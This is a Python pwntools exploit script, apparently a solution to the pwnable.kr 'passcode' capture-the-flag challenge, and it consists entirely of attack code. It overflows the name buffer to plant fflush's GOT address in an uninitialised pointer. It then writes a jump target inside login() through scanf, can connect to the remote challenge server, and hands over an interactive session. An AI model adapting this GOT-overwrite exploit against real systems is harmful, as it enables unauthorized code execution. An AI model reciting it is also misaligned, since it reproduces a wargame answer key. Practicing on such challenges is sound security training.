#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./passcode", checksec=False)
context.arch = "i386"
context.log_level = "info"

fflush_got = elf.got["fflush"]
win = elf.symbols["login"] + 0x99

payload = b"A" * 96 + p32(fflush_got)

assert len(payload) == 100
assert not any(c in p32(fflush_got) for c in b"\t\n\r\v\f")

log.info(f"fflush@GOT : {hex(fflush_got)}")
log.info(f"Win target : {hex(win)}")
log.info(f"Payload    : {len(payload)} bytes")

if args.REMOTE:
    host = args.HOST or "pwnable.kr"
    port = int(args.PORT or 10004)
    io = remote(host, port)
else:
    io = process(elf.path)

io.sendlineafter(b"enter you name : ", payload)

io.sendlineafter(
    b"enter passcode1 : ",
    str(win).encode()
)

io.interactive()
